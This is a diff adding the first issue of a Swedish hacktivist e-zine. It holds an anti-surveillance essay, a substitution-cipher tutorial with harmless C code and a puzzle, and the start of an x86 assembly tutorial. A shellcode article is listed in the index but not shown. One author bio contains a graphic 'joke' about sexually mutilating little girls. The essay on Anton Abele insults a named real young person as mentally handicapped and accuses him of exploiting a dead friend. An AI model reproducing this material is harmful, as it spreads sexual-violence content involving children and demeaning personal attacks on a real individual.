@@ -1,0 +1,1797 @@
+[==============================================================================]
+          echo $hack. "FREEDOM OF SPEECH, USE IT OR LOSE IT!"  - = == ===- -===]
+            -      =     =    =   = ===   === == === == = = =========== -===- =]
+
+             ___ ___          __    __________.__               
+            /   |   \   ____ |  | __\____    /|__| ____   ____  
+           /    ~    \_/ ___\|  |/ /  /     / |  |/    \_/ __ \ 
+           \    Y    /\  \___|    <  /     /_ |  |   |  \  ___/ 
+            \___|_  /  \___  >__|_ \/_______ \|__|___|  /\___  >
+                  \/       \/     \/        \/        \/ 0x01\/ 
+
+================================================================================
+Index 
+================================================================================
+
+0x00 Intro ..............................................................Profeta
+0x01 Söker moderatorer ..................................................Profeta
+0x02 Vi som skriver.............................................................
+
+0x03 Övervakningen är här ...............................................Profeta
+0x04 Anton Abele, vem fan e det? .........................................Anonym
+
+0x05 Monoalfabetiska substitutionschiffer...............................swestres
+0x06 Introduktion till assemblerprogrammering...........................swestres
+0x07 Skalkod för glädje och profit.......................................Profeta
+
+0xFF The End....................................................................
+
+================================================================================
+0x00 - Intro                                                             Profeta
+================================================================================
+     
+    Åter igen tar jag upp min gamla textredigerare och försöker mig
+    på att börja ett e-zine i den gammla 90-tals stilen. En e-zine som
+    behandlar ett mycket vakert och anorlunda ämne som kallas hacking.
+    För att vara mer exakt i vad jag menar så ska jag säga hacktivism!
+    En livstil som fått mig att bli den personen jag är idag och ett
+    sätt att se på livet som jag anser vara mycket hälsosamt.
+      Du som läser detta första nummer tänker antagligen "Yes! Äntligen
+    kommer jag att bli en überhacker med ultra skills!" och du kan inte
+    ha mer fel. Även om vi kommer att behandla ämnet i form av guider
+    och artiklar i tidningen så är det inte det som gör dig till en
+    hacker. Det är vad e-magazinet egentligen handlar om, hur man blir
+    och vad som är en hacker. Per min och andra medlemmar på hackensteins
+    definition såklart, men jag tror att det finns en hel del personer
+    där ute som tycker som vi.
+      Vi kommer prata mycket anonymitet och hur du säkrar dig inför
+    nya tider i form av proxy, ssh-tunnlar, kryptering osv. och vi kommer
+    också att prata mycket *NIX, det kommer bli *NIX i mängder. Inte för
+    att vi vill framstå som ett gäng ultrahackers bara för att vi använder
+    detta system utan för att utbilda dig som inte använder det eller
+    funderar på att börja använda det. Men det är inte enbart pga. det
+    utan framför allt för att vi gillar systemet och tycker att det är
+    mer än värt att ta upp i den här simpla formen av media.
+
+     Som du kanske märkt ligger hackenstein numera som en liten rebellisk
+    sida på Internet vars ända syfte är att locka seriösa personer som
+    verkligen vill lära sig mer. Vi vill försöka locka ditt duktiga och
+    nybörjare för att man ska kunna lära sig av varanda.
+      Vi har gått ifrån en skiddie sida till att bli ett seriöst data-
+    säkerhetsforum där seriösa diskussioner håller hus. Det här betyder
+    inte att vi inte accepterar att det finns folk med andra intressen
+    än att bara lära sig men att det främst är till dem som vill lära
+    sig som jag numera har hand om hackenstein.
+      Vi försöker inte dra det i skymundan att vi har varit en sida
+    som inom datasäkerhetens ramar anses vara "lam" och vi vill verkligen
+    framföra att en ny tid är kommen - vi utvecklas i takt med livet!
+
+     Med dessa ord vill jag välkomna dig som läsare till ett magasin som
+    har det där lilla extra för dig som anser dig vara rebell vid din
+    dator, för dig som vill lära dig och för dig som inte har något
+    bättre för dig! Hoppas ni ska gilla tidskriften och att ni läser
+    framtida nummer samt skickar in en massa frågor, artiklar m.m. till
+    våran e-mail adress som du kan finna i slutet av den här tidningen!
+
+================================================================================
+0x01 - Söker moderatorer                                                 Profeta
+================================================================================
+ 
+    I och med det nya forumet söker vi på hackenstein nya moderatorer
+    som vill hjälpa oss att hålla koll och sköta om forumet. Du som
+    söker ska vara duktig inom ämnet vars fora du vill ha hand om och
+    det är framför allt datasäkert och programmerings -personen i båda
+    könen som vi söker!
+
+    Känner du kall, plikt eller bara att du vill så tycker jag att du
+    ska rapportera om detta via någon av våra kommunikations medier t.ex.
+    forumet, IRC eller via e-mail. Vi vill också ha en kort presentation
+    ang. vad du anser dig kunna och lite om dig själv typ intressen etc.
+    inget direkt personligt som namn, adress eller personnummer behöver
+    finnas med utan det är din kunskap som vi värderar!
+
+================================================================================
+0x02 - Vi som skriver...                                                 hckzine
+================================================================================
+
+Retard
+    en anarkosyndikalist i sina bästa år. Intresserar sig av datorer och 
+    säkerhet i allmänhet, oavsett om det gäller social engineering eller vanliga
+    datamaskiner. När jag inte sitter vid datorn organiserar jag mig politiskt, 
+    äter kebab eller sitter vid datorn. Retarded Retard is retarded.
+
+Profet (Profeten eller w/e)
+    skulle vilja kategorisera sig som libertan och är tyvärr inte i sina bästa 
+    år ännu men snart! Intresserar sig för programmering (PHP) och datasäkerhet  
+    sedan tidig ålder, har sysslat med social engineering i ett flertal år och 
+    härstammar från Chile. Är bosatt i Norge just nu där han jobbar med datorer 
+    och extraknäcker på lager (så han är stark!). Skaparen av Hackenstein och 
+    nästan alla projekt under fanan. Skriver en del politiskt under synonymer 
+    m.m.
+
+swestres
+    är en anarkosyndikalistisk nationalsocialist som våldtar små flickor 
+    genom att snitta upp deras bukar och knulla hål på tolvfingertarmen. 
+    Om han ska vara lite seriös så är han en kille i tjugoårsåldern som gillar
+    programmering och datasäkerhet. I den ordningen. Slut. Frågor? Inga frågor.
+
+================================================================================
+0x03 - Övervakningen är här                                              Profeta
+================================================================================
+
+    Läste i tidningen att det ska införas fler poliser och att fler
+    kameror kommer sättas upp i Stockholm stad. Jag läste dagen efter
+    om hur hyresvärdar m.fl. kan kolla när och vart du går ut och in
+    med de nya brickorna som används på portdörrarna på en del lägen-
+    heter. Efter det fick jag höra om att all traffik som går ut ur
+    sverige (telefon, sms och internet m.m.) ska börja loggas och
+    avlyssnat. Idag läser jag en artikel som beskriver en idé om att
+    börja logga och avlyssna alla digital/analog traffik som sker i
+    Sverige, som grädden på moset.
+      Jag är inte rädd för den här utveckligen pga. att jag är en
+    kriminell person och är rädd att bli avslöjad. Men jag är rädd
+    för utveckligen för att jag vet att informationen kommer att
+    missbrukas och det behöver vi inte ens ta upp till diskussion om.
+    Jag är rädd för att jag har hört talas om en tid då vi i väst-
+    europa stolt berättade om våran frihet och såg på en värld
+    utanför våran egen där folk kontrollerades med ett järngrepp.
+    Dom säger att det är för att förebygga terrorism men jag ser det
+    inte så, jag ser det som om att terroristerna redan har vunnit
+    när förslag som dessa kommer upp på så hög nivå. Dom har
+    lyckats att ta ifrån oss våran frihet! De kriminella har lyckats
+    att ta ifrån oss våran frihet! Är det rätt? Är det i en sådan
+    värld du vill leva? Om inte bör du likt mig aktivt försöka förhindra
+    detta genom utbildning, protester och debatt!
+
+    Är du för dessa beslut är du lika blåögd som Boström och förtjänar
+    inte friheten du blivit tilldelad för en massa år sedan!
+
+    ---------------
+
+    "De som ger upp sin grundläggande frihet för att köpa sig 
+    ytterligare trygghet, förtjänar varken frihet eller trygghet.."
+    - Benjamin Franklin
+
+    "Utan yttrandefrihet är ingen sökning för sanning möjlig... är ingen 
+    upptäckt av sanning användbar... Bättre en tusenfald missbruk av 
+    yttrandefrihet än förnekelse av yttrandefrihet. Missbruket dör på en 
+    dag, men förnekandet slaktar livet av folket, och begraver hoppet av 
+    rasen." - Charles Bradlaugh
+
+    "Jag håller inte med om vad du säger, men jag är beredd att gå i döden 
+    för din rätt att säga det." - Evelyn Beatrice Hall
+
+    ---------------
+
+    Är du beredd att ge upp din frihet att yttra och tänka som du vill? Är
+    du beredd att ge upp din frihet att vara som du vill när du vill och hur
+    du vill? Är du beredd att gå in i tyranniets lugna hav? Tror du jag är
+    galen? Vi kan varje dag konstatera att politikerna tar bort en bit av
+    våran frihet, dag för dag! Dessa dårar sover inte, dem som verkligen
+    ligger bakom idéerna sover aldrig! Vågar du sova?
+      Jag anser inte att fler kameror kommer att fåbort kriminallitet från
+    gatan som myndigheterna verkar tro. Dom satsar på fel område och jag
+    tänker inte sitta här och vänta på att felen ska ge eftersmak! Nej,
+    satsa på att utbilda ungdomar genom att PRATA, satsa på fler fritids
+    gårdar och om dessa inte blir populära - kolla igenom vad ungarna vill
+    ha! Ungar spelar inte fia med knuff, schack m.m. utan vill ha det dom
+    vill ha, tv-spel, datorer och musik brukar gå hem hos de flesta!
+    "Men nej, detta blir ju för dyrt ju!" Men för i helvete (ursäkta) tror
+    du att poliser jobbar gratis? Tror du att kameror är gratis? Tror du
+    att övervakning och loggning av medborgare i allmänhet är gratis???
+    Lägg ner resursenta på bättre saker!
+      Jag har inget att dölja och är alltid öppen med vem jag är och vad
+    jag tycker och tänker! Men jag ska erkänna att jag börjar bli rädd för
+    att göra det nu.
+
+    Som jag tidigare i artikeln har försökt få fram är det mycket "jag
+    har rent mjöl i påsen"-snack som härskar och det är fel att se det på
+    det här sättet enligt mig. Det handlar inte om man är laglydig eller
+    inte utan om din rätt att få tycka som du vill och vara som du vill!
+    Det är bara en tidsfråga innan man börjar med att karlägga dina
+    politiska intressen och kartlägga texter som dessa - och bli straffad
+    för att man går emot lagen. Det är inte längre en domerdags profet som
+    skricker detta på gatan utan det är faktiskt sanning numera. Danmark
+    är redan där och det kan vi bla. tacka våran käre Boström för!
+      Det man nu vill göra i Sverige är att bryta en av våra grundlagar
+    som tydligt säger att brevhemligheten är grundlagskyddad! Det är sjukt
+    och börjar likna någon form av scfi-film mer en det Sverige jag känner
+    till och växte upp i.
+
+    Tänk dig själv att dina porrsurfnings vanor kommer loggas, vad du kollar
+    på youtube kommer loggas, vilka du pratar med och när kommer loggas, vad
+    du sökte på google kommer (och gör redan) loggas. Den där könssjukdomen
+    du trodde dig ha när du var yngre kommer loggas efter som du sökte om
+    ämnet på Internet!
+      Kameror i vårat samhälle kommer att kunna följa dig för varje steg, var,
+    hur och när då befinner dig på olika ställen. Brickorna till portdörren
+    kommer kunna användas för att se när du går ut och in genom porten. Din
+    inköp loggas med hjälp av ditt VISA-kort. De resor du beställer kommer
+    loggas, spriten du köper över Internet kommer att loggas. Polisen och
+    myndigheter (och vem vet vilka mer) kommer kunna följa ditt liv från
+    början till slut, från BB till begravningen med en lupp och analysera dig
+    tills det inte finns mer att veta om dig.
+      Sen kan man inte vara allvarlig om man tror att det här under några
+    omständigheter kommer ta bort kriminalitet och frågan är om den ens kommer
+    minska. För faktum är att kriminella alltid är steget före dig och alla
+    myndigheter!
+
+    http://swartz.typepad.com/texplorer/2007/09/vi-srjer-danmar.html
+
+   En mycket intressant artikel jag hittade efter att ha skrivit den här texten.
+   Den behandlar Danmarks nya lag.
+
+    Det är dags att vi börjar agera innan det är försent! Det är dags att
+    VI får våran röst hörd så länge det är VI som styr detta land med demokratin
+    som vårat verktyg! AGERA IDAG!
+    Dags att öppna ögonen kära medborgare - innan det är försent!
+
+    - Johan Öhman Saldes aka. Profeten
+
+================================================================================
+0x04 - Anton Abele, vem fan e det?                                        Anonym
+================================================================================
+
+    Ingen som följt media under de senaste veckan/veckorna har kunnat
+    undegå en unge som vars namn nästan är en plåga för mig att skriva,
+    Anton Abele. Personen bakom grupen Stoppa gatuvåldet! på hemsidan
+    facebook. En grupp som fått oerhört mycket publicitet i alla former
+    av medier i skrivande stund senaste på MTV.
+      Har har genom den här gruppen skickat ut ett mycket bra medelande
+    om att stoppa gatu våldet och fått oerhört många bakom sig. Synd att
+    grabben är mentalt handikappad och inkapabel att utrycka sig så man
+    förstår både på sitt egna språk och engelska (som väl ändå anses vara
+    vårat andra språk i detta avlånga land?). Måste säga att det är så
+    han framstår för mig och jag förstår verkligen inte varför han har
+    fått så mycket publicitet. Jag måster erkänna att jag är lite avundsjuk
+    eller det är egentligen fel ord. Jag är förbannad för att han inte
+    har en aning om vad han snackar om och nu använder sin avlidna "vän"
+    för att bli känd.
+      Att det existerar gatuvåld är inget konstigt över huvudtaget och det
+    är en del i att vara människa att slåss, dock verkligen oturligt att
+    folk ska behöva dö pga. detta! Men för fan, detta händer varje dag!
+    I förorten blir folk nersparkade och dödade lite då och då och i
+    bästa fall får dom en liten notis i tidningen. Men nu var det en kille
+    ifrån överklassen som blev attackerad, ni var det en kille med föräldrer
+    som har pengar och inte bor i förorten som blev attackerad och då
+    är det helt plöttsligt en jälva grej? Vad händer folk?
+      Jag såg inte att Anton startade en grupp emot kränkningen av rättigheter
+    som dagligen sker under nationen Kina. Jag såg inte Anton yttra sig
+    när den där killen blev misshandlad av ett gäng på 15 personen utanför
+    en förortskrog i söderort! Nu kanske det var så att det här var en vän
+    och det kan man respektera, jag menar det är ju självklart! Men när han
+    inte ens bryr sig om att komma på minnestunden blir man faktiskt lite
+    skeptisk, men han hade väl inte tid? Kanske var han upptagen med media
+    eller att prata med snoop dog? Ja, vem bryr sig det är inte en stor
+    grej egentligen? Jag hörde inte herr Anton yttra sig ang. ungdomars
+    egentliga problem. Jag syfta naturligtvist på föräldrarnas hopplöshet
+    och hur svårt det är för en ensamstående mamma att tahand och upp-
+    fostra 3 ungar med minimum inkomst!
+
+    Nej Anton, om du läser detta eller får höra om min artikel tycker jag
+    du bör skämas! Bättre att hålla tyst när det gäller något så alvarligt
+    som detta en att ljuga, snacka bullshit och försöka framstå som att
+    man vet vad det egentligen handlar om!
+      Jag menar, jag accepterar att du vill yttra dig men om du verkligen
+    menar det du försöker förmedla så tycker jag att det är din plikt att
+    i alla fall göra LITE research!
+
+    - Anonym
+
+================================================================================
+0x05 - Monoalfabetiska substitutionschiffer                             swestres
+================================================================================
+
+I denna första kryptorelaterade artikel kommer jag att beskriva vad ett
+monoalfabetiskt substitutionschiffer är, hur det fungerar, ge exempel på hur
+man använder det och även hur man knäcker det. 
+
+Substitutionschiffer är chiffer där en bokstav (analogt sett) bytas ut mot en
+annan enligt ett givet alfabet. Att det är monoalfabetiskt innebär att endast
+ett chifferalfabet används, en bokstav i klartext har alltid samma motsvarighet
+i chifferalfabetet. Om ett A i klartext är ett C i chiffertext kommer det vara 
+så genom hela det chiffrerade meddelandet.
+
+Denna typen av chiffer har används väldigt länge, två tidiga chiffersystem är
+Caesarchiffer (där chifferalfabetet är ett förskjutet klartextalfabet) och 
+Atbash (där chifferalfabetet är ett inverterat klartextalfabet). rot13 är ett
+annat exempel på ett monoalfabetiskt substitutionschiffer, där (som alla *nix
+användare förhoppningsvis vet) chifferalfabetet är förskjutet 13 steg i 
+förhållande mot klartextalfabetet (det engelska). I grund och botten ett 
+caesarchiffer. 
+
+Eftersom denna typen av chiffer fanns innan datorer är det således menat att 
+kunna hanteras manuellt, med papper och penna, med pinne och våt sand, med lera
+och sticka.
+
+Men vad vore en artikel utan kod. Vi vill ju kunna generera våra egna 
+chifferalfabet. Här nedan följer en bit C kod som gör just det. Det är skrivet
+för POSIX (*nix) system och jag passade på att lägga till _exit() istället för
+return från main så att vi kan skippa C run-time funktioner och avsluta 
+processen direkt. Vad det betyder och innebär för programmet är av mindre 
+betydelse för denna artikel. Koden är ett snabbt hopkok som knappast är O(N), 
+men det är av mindre betydelse för dagens datorer.
+
+---- KOD
+/*
+  agen.c - Alphabet generator for monoalphabetic substitution cipher
+           Not the sharpest of knifes, but it does its job
+
+  compile:
+           gcc -lc -nostdlib -e main -Wall -std=c99 -o agen -O2 -s agen.c
+
+	   Generates optimized code without CRT wrappers and symtables. With
+	   a better linker script for ld and some asm wrapper headers, we can 
+           make it even more compact. Size does matters!
+*/
+
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+#define STDOUT STDOUT_FILENO
+#define RET_OK 0
+#define RET_ERR 1
+
+
+int main()
+{
+    int fd, curr=0;          // curr is current character
+    char alphabet[30] = {0};
+    unsigned char ix;        // alphabet index where a char should be inserted
+    fd = open("/dev/urandom", O_RDONLY);
+    if (fd == -1) {
+	write(STDOUT, "Couln't open urandom\n", 21);
+	_exit(RET_ERR);
+    }
+
+    alphabet[29]=10; //newline
+
+    while (curr < 29) {
+	
+	// obtain an index value 
+	if (read(fd, &ix, sizeof(ix)) != sizeof(ix)) {
+	    write(STDOUT, "urandom read error\n", 19);
+	    close(fd);
+	    _exit(RET_ERR);
+	} else {	
+	    ix = ix % 29;
+	}
+
+	// make sure the index isn't taken
+	if (alphabet[ix] != 0) {
+	    continue;
+	} 
+
+	// insert the character in the alphabet
+	if (curr < 26) {       //A-Z
+	    alphabet[ix] = 65+curr;
+	}
+	else if (curr == 26) {  // Å
+	    alphabet[ix] = 197;
+	} 
+	else if (curr == 27) {  // Ä
+	    alphabet[ix] = 196;
+	} 
+	else if (curr == 28) {  // Ö
+	    alphabet[ix] = 214;
+	}
+	    
+	curr++;
+    }
+
+    close(fd);
+
+    write(STDOUT, alphabet, 30);
+    _exit(RET_OK);
+}
+---- KOD
+
+Låt oss kompilera och köra det:
+
+$ gcc -lc -nostdlib -e main -Wall -std=c99 -o agen -O2 -s agen.c
+$ ls -la agen && ./agen 
+-rwxr-xr-x 1 scmc scmc 2184 20 Nov 16.44 agen
+OAPLBÄQUYMÖEFWDGHCINXÅZTVKRSJ
+
+På sista raden har vi vårat chifferalfabet. Låt oss lägga till ett 
+klartextalfabet ovanför och börja chiffrera en text.
+
+Klartextalfabet: abcdefghijklmnopqrstuvwxyzåäö
+Chifferalfabet:  OAPLBÄQUYMÖEFWDGHCINXÅZTVKRSJ
+
+a motsvarar O, b motsvarar A, etc.
+Texten vi ska chiffrera är :"tio fi grdmän vid rödskär". Innan vi börjar 
+chiffrera går jag igenom lite stilregler. Chiffertext skrivs traditionellt sett
+i grupper om fem bokstäver. Klartext skrivs med små bokstäver och chiffertext
+med stora. Då börjar vi.
+
+Vi ställer upp meddelandet och skriver dess motsvarighet i chiffertext under:
+
+tio fi grdmän vid rödskär
+NYD ÄY QCLFSW ÅYL CJLIÖSC
+
+Sedan delar vi upp chiffertexten i grupper om fem bokstäver:
+
+NYDÄY QCLFS WÅYLC JLIÖS C
+
+Hmm, vi har ett ensamt C på slutet. Vi lägger till lite  skit för att fylla ut 
+gruppen och försvåra kryptoanalys (något som kommer att behandlas senare i 
+artikeln).
+
+NYDÄY QCLFS WÅYLC JLIÖS CPHMW
+
+Och där har vi vårat chiffrerade meddelande! Det skickar vi sedan in till staben
+som kontrollerar mot chifferalfabetet och översätter N till t, Y till i osv.
+Även om fi mottar meddelandet har de ingen aning om vad det betyder, eller?
+
+Desvärre är monoalfabetiska substitutionschiffer väldigt osäkra. De är mer 
+lämpade för tankelekar i stil med korsord och sodoku än vad de är för militära
+hemligheter. Att analysera ett kryptografiskt system i syfte att hitta svagheter
+och/eller knäcka det kallas för kryptoanalys. En sk. frekvensanalys är bland 
+det första man gör när man får in en chiffrerad text och inte vet hur den är 
+chiffrerad. 
+
+Frekvensanalys går till som så, att man räknar varje förekommande tecken i det
+chiffrerade meddelandet, sammanställer det i en tabell (som kallas för 
+frekvenstabell) och jämför med en frekvenstabell för en klartext skriven på
+samma språk, med samma skrivsätt. Är det ett militärt meddelande används det
+en del förkortningar, och man kan då generera en frekvenstabell från tidigare
+meddelanden för att få fram hyfsade värden. Har man inga tidigare meddelanden 
+att utgå från använder man en frekvenstabell för samma språk med ett språkbruk
+som är likt det i meddelandena. Ju större underlag man har för tabellerna
+desto bättre är de.
+
+Här är en länk till en frekvenstabell över det svenska språket (om du läser
+det här några år efter det publicerats är det sannolikt att länken är död, 
+tough luck): http://w3.msi.vxu.se/users/rnyqvist/mab742/ht06/frekvenstabell.pdf
+
+Är frekvenstabellen för chiffertexten någorlunda överensstämmande med den för
+klartexten är det med stor sannolikhet ett transpositionschiffer (ett 
+chiffersystem där man, i stället för att byta ut bokstäver, byter plats på dem).
+Består frekvenstabellen för chiffertexten mer eller mindre av samma värden 
+(dvs. en jämn spridning av tecken) är det inte ett substitutionschiffer. Om 
+däremot majoriteten av bokstäverna i chiffertexten har en motsvarande frekvens
+för andra bokstäver i klartexten kan man vara ganska säker på att det är ett
+monoalfabetiskt substitutionschiffer. Om bokstaven E förekommer i 9% av 
+tecknena i klartexten och bokstaven G förekommer i 8.78% av tecknena i 
+chiffertexten kan man utgå från att G motsvarar E och arbeta sig vidare från 
+det.
+
+Sist men inte minst tänker jag låta Dig som läsare få möjlighet att prova på 
+dina nyvunna kunskaper om kryptoanalys av monoalfabetiska substitutionschiffer 
+genom att presentera en chiffertext med ett annat kryptoalfabet.
+
+WYÖGK XTKCW CBMCÖ GWVAR RCVGY VGECT TCTTK XBVHG RYICG ÖYVRY 
+WWÅPÅ STÅÖX PMRYW YUYVP ÅGXPM JQMVY VÖGIH TNGEC NCVCG NYÖGE 
+SXTÅG 
+
+Meddelandet är på svenska och relativt kort, vilket kan leda till att det 
+statisktiska underlaget för en frekvensanalys inte är representativt för det 
+svenska språket, så ta inget för givet. Det är ingen utmaning om det inte är 
+svårt.
+
+Eftersom jag gillar att programmera har jag även slängt ihop ett stycke C kod
+som sammanställer antalet bokstäver i texten samt hur ofta en viss bokstav
+förekommer. Procentvärden får du räkna ut själv, eller ännu bättre, modifiera
+programmet att göra.
+
+---- KOD
+#include <stdio.h>
+//frekvens.c, compile: gcc -Wall -std=c99 -o frq frekvens.c
+
+int indexLookup(char *alphabet, char letter)
+{
+    int ix=0;
+    while (*alphabet) {
+	if (*alphabet == letter) {
+	    return ix;
+	}
+	ix++;
+	alphabet++;
+    }
+    return -1;
+}
+
+int main()
+{
+    char *ctext = "WYÖGK XTKCW CBMCÖ GWVAR RCVGY VGECT TCTTK XBVHG RYICG ÖYVRY"
+	"WWÅPÅ STÅÖX PMRYW YUYVP ÅGXPM JQMVY VÖGIH TNGEC NCVCG NYÖGE SXTÅG";
+    char *alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ";
+    short freqtbl[29] = {0};
+    int ix, i, ccount=0;
+
+    while (*ctext) {
+	ix = indexLookup(alphabet, *ctext);
+	if (ix < 0 || ix > 28) {
+	    ctext++;
+	    continue;
+	}
+	
+	ccount++;
+	freqtbl[ix]++;
+	ctext++;
+    }
+
+    for(i=0; i<29; i++) {
+	printf("%c: %d  ", alphabet[i], freqtbl[i]);
+	if ((i%6) == 0) {
+	    printf("\n");
+	}
+    }
+    printf("\nAntal tecken: %d\n", ccount);
+
+    return 0;
+}
+---- KOD
+
+Den som först skickar in rätt svar till E-postadressen som nämns längst ner
+i zinet får ett hedersomnämnande i nästa zine. Och en klapp på magen.
+
+================================================================================
+0x06 Introduktion till assemblerprogrammering i GNU/Linux system        swestres
+================================================================================
+
+Inledning
+---------
+Assembler, detta mytomspunna programmeringsspråk. Överskattat av vissa som ser
+det som en form av slutgiltig upplysning (det gjorde iaf jag innan jag lärde 
+mig det), underskattat av andra som ser det som onödigt när man idag har 
+optimerade HLL-kompilatorer.
+
+Jag skulle idag vilja säga följande: att lära sig assembler ger stunder av
+upplysning, aha-upplevelser då molnen på himlen glider isär och ett gudomligt 
+ljus strålar ner över ens tangentbord samtidigt som änglakören sjunger 
+halleluja, lovsjung Gud! Det ger en också stunder av förtvivlan, då man i timmar
+sitter med debuggern och försöker hitta den där lilla buggen som skapar
+ett segmentation fault lite då och då ibland. Man undrar, "varför valde jag att
+skriva det här projektet helt i assembler, varför inte i kombination med något
+annat språk?". Sen när slutprodukten väl är färdig är man ganska nöjd över att
+den bara är 4 KB och fungerar felfritt.
+
+Fördelen med assemblerprogrammering jämte andra högnivåspråk är, som jag ser det
+tre:
+  - Flexibilitet, man kan göra saker i assembler som de flesta språk förbjuder
+    dig att göra. Kod som ändrar sig själv vid körning är ett exempel.
+  - Storlek, efter ett tag lär man sig hur stora assemblerinstruktionerna är
+    och kan på så sätt skriva kod som är riktigt liten. Man slipper dessutom
+    all bloat som läggs till av HLL-kompilatorer i form av interface och 
+    wrapping funktioner som __libc_start_main(), __cxa_atexit() och liknande. 
+    Även om man inte behöver dem lägger gcc till dem by default.
+  - Snabbhet. Vissa instruktioner är snabbare än andra, och vissa är riktigt
+    långsamma. Genom erfarenhet lär man sig trick för att snabba upp kod och
+    lösa problem på andra sätt än de mest uppenbara. Ta ett C-bibliotek som 
+    exempel. För att göra koden så lätthanterlig som möjligt styckar man oftast
+    upp funktioner i dess minsta beståndsdelar. Det är skitbra ur 
+    utvecklingssynpunkt, det gör koden mer modulär och lätthanterlig som sagt.
+    Men ska man skriva ett program som ska vara så snabbt som möjligt kan alla
+    call och ret slösa klockcykler.
+
+Som jag ser det är assembler bra för att:
+  - Snabba upp vissa delar (flaskhalsar) av program skrivna i andra språk som
+    t.ex. C. 
+  - Skriva små, snabba, one-of-a-kindprogram, t.ex. RATs eller bakdörrar.
+  - Udda program som bootstrappers, Forthtolkar, operativsystemskärnor, etc som
+    inte riktigt följer samma applikationsprogrammeringsprinciper som t.ex. ett
+    ordbehandlingsprogram gör.
+
+Nackdelarna med assembler kommer jag inte fokusera på, orka vara objektiv och
+göra en rättvis analys.
+
+Denna assemblerintroduktion förutsätter viss kunskap om Linux och 
+Linuxprogrammering sen tidigare. 
+
+Jag har försökt göra upplägget så pedagogiskt som möjligt, undvika sidospår och
+liknande. Men fortfarande är det skillnad på att kunna och att kunna lära ut.
+Så ta det för vad det är, en möjlighet att lära sig någonting nytt. Förvänta
+dig inte att bli någon expert efter att du läst det här (ämnet är stort nog för
+mer än en bok), kompilerat exemplen osv. Förhoppningsvis har du lärt dig 
+tillräckligt för att lattja runt lite på egen hand. Det är trots allt så man 
+lär sig bäst.
+
+Programmen vi behöver
+---------------------
+Först och främst förutsätter jag att du har tillgång till ett Linuxsystem som
+körs på en IA32-kompatibel (80x86) processor. Ingen AVR32 assembler här. Vidare
+kommer jag att använda NASM, The Netwide Assembler för assemblering av källkod
+samt ld (GNU Linker) för länkning av objektskod. Om du inte vet vad det är så
+kommer det framgå snart.
+
+För att kontrollera att du har detta kan du öppna ett skal och skriva:
+
+$ nasm -v
+NASM version 0.98.39 compiled on Oct 26 2007
+$ ld -v
+GNU ld version 2.16.1
+
+Det betyder att du har programmen i fråga. Får du upp något i stil med:
+
+$ nasm
+bash: nasm: command not found
+
+så betyder det att du inte har nasm. NASM går att tanka från projektets hemsida:
+http://nasm.sourceforge.net/
+och ld ingår i GNU-paketet binutils som finns att ladda ner här:
+http://www.gnu.org/software/binutils/
+
+Vi behöver också något att skriva källkod i. Vilket program man använder för
+det handlar mer om personlig smak än om någon praktisk betydelse. Själv använder
+jag Emacs för det, men IDE'er som Geany eller Anjuta är bra de med. För mer
+information:
+http://www.gnu.org/software/emacs/
+http://geany.uvena.de/
+http://anjuta.sourceforge.net/
+
+Hello, World!
+-------------
+Vi börjar med ett program som skriver ut textsträngen "Hello, World!" till 
+skärmen och därefter avslutar sig själv och returnerar talet 88 (ingen
+nazianknytning) till skalet.
+
+---- KOD
+;;;; hello_world.asm
+
+BITS 32
+GLOBAL _start
+
+section .data
+strHello	db  'Hello, World!',10
+strHelloLen	equ $-strHello
+
+section .text
+_start:
+	;; Print "Hello, World!"
+	mov	al, 4
+	mov	bl, 1
+	mov	ecx, strHello
+	mov	dl, strHelloLen
+	int	0x80
+
+	;; Exit with error code 88
+	xor	eax,eax		
+	mov	ebx, eax
+	inc	eax
+	mov	bl, 88
+	int	0x80
+
+---- KOD
+
+Woohoo. Mycket text och konstiga ord. Lite förklaringar behövs.
+
+;;;; hello_world.asm
+
+Detta är en kommentar. Allt mellan semikolon och nyradstecken ignoreras av
+assemblern. Det används för att kunna förklara och dokumentera källkoden
+infoga copyrightinformation, licenser och liknande. Det är inte lag, men en
+dokumentationsheader (som i det här fallet endast nämner filnamnet) brukar
+göras med fyra (eller tre) semikolon, ett stycke med två semikolon, och en 
+kommentar i slutet på en instruktion med ett semikolon.
+
+BITS 32
+GLOBAL _start
+
+Det första säger till att nasm ska generera 32-bitarskod. x86-processorn har
+två större lägen, 16-bitars och 32-bitars. Linux körs i 32-bitarsläge. Den andra
+raden säger till att vi symbolen _start ska vara global, den ska kunna kommas
+åt utanför den här enheten (i vårt fall av länkaren).
+
+section .data
+samt
+section .text
+
+Vår färdiga programfil (och objektsfilen med, båda är i ELF-format) kommer att
+bestå utav olika delar, sektioner. I sektionen som heter .data lagras data som
+är läs-/skrivbar. Strängar och liknande. I sektionen .text lagras programkod 
+som normalt är skrivskyddad. Dessa assemblerdirektiven anger i vilken sektion 
+det som följer hamnar i.
+
+strHello	db  'Hello, World!',10
+strHelloLen	equ $-strHello
+
+strHello är en ettiket som namnger starten på strängen "Hello, World!" så att
+vi kan referera till den på ett enkelt sett. db är en pseudoinstruktion som 
+står för "define byte(s)", och används för att lagra vissa bytevärden. Strängar
+anges inom ''. Tian på slutet är ett nyradstecken.
+equ är ett assemblerdirektiv för att deklarera konstanter, tal vid kompilering.
+$ är en speciell symbol som anger aktuell position. Vad vi gör är att ge
+symbolen strHelloLen värdet av den nuvarande positionen subtraherat med den
+position som vår "hello world"-sträng började på, alltså längden av den.
+
+_start:
+
+Detta är en symbol, en etikett. En namngiven position i programfilen. Det är
+här körningen av programmet startar. 
+
+Det får räcka med förklaringar nu. Själva assemblerinstruktionerna kommer vi
+att komma in på senare.
+
+Ovanstående kod sparar vi i en egen fil som vi döper till hello_world.asm. Vi 
+skapar ett körbart program genom att assemblera det med nasm och länka med 
+hjälp av ld:
+$ nasm -felf -o hello_world.o hello_world.asm
+$ ld -o hello -s hello_world.o
+
+Innan vi går vidare förklarar jag vad ovanstående kommandoväxlarna gör. 
+
+nasm:
+    -felf: Den objektfil som innehåller den assemblerade koden ska vara i 
+           objektsformatet ELF, standard på Linuxsystem
+
+    -o hello_world.o: Objektsfilen kommer att namnges hello_world.o. Detta är
+                      standardnamnet (ursprungsnamnet.o) men vissa versioner
+                      döper det till .obj eller liknande istället, så det är bra
+                      att namnge explicit.
+
+    hello_world.asm: namnger filen som innehåller den källkod vi vill få 
+                     assemblerad
+
+ld:
+    -o hello: Namnger vår färdiga programfil till hello.
+
+    -s: Strippar programfilen från debugdata och länkningsinformation 
+        (gör den mindre)
+
